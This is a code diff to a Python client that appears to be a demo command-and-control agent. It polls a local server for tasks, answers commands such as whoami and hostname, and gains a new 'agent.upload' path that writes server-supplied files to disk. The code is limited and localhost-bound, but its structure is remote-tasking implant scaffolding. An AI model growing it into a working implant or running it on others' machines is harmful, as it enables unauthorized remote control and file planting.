@@ -5,9 +5,10 @@ import platform
 import socket
 import time
 import uuid
-from socket import timeout as SocketTimeout
+
 from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
+from upload_handler import handle_upload_file
 
 
 SERVER_URL = "http://127.0.0.1:8080"
@@ -51,7 +52,7 @@ def get_command():
             return json.loads(body.decode("utf-8"))
     except TimeoutError:
         return None
-    except SocketTimeout:
+    except socket.timeout:
         return None
 
 
@@ -66,11 +67,42 @@ def collect_info():
     }
 
 
+def run_command(command_obj):
+    """
+    Execute command from server
+    
+    Args:
+        command_obj: Can be string (legacy) or dict with 'command' key
+    
+    Returns:
+        Result or dict with status
+    """
+    if isinstance(command_obj, dict):
+        command = command_obj.get('command', '').strip()
+        
+        # Handle file upload
+        if command == 'agent.upload':
+            return handle_upload_file(
+                command_obj.get('file_path'),
+                command_obj.get('file_data'),
+                command_obj.get('file_size')
+            )
+        
+        # Legacy command format (for future expansion)
+        return run_demo_command(command)
+    
+    else:
+        # String format (legacy)
+        return run_demo_command(command_obj)
+
+
 def run_demo_command(command):
     command = command.strip()
 
     if command == "agent.exit":
+
         return "agent.exit"
+
     if command == "whoami":
         return getpass.getuser()
     if command == "hostname":
@@ -120,11 +152,12 @@ def handle_task(task):
     message_id = task.get("message_id")
     print(f"[DEBUG] Received command: {command}")
 
-    output = run_demo_command(command)
+    output = run_command(command)
+
     if output == "agent.exit":
         send_result(message_id, "Agent exiting")
         print("[*] Exit command received")
-        return False
+        os._exit(0)
 
     send_result(message_id, output)
     return True
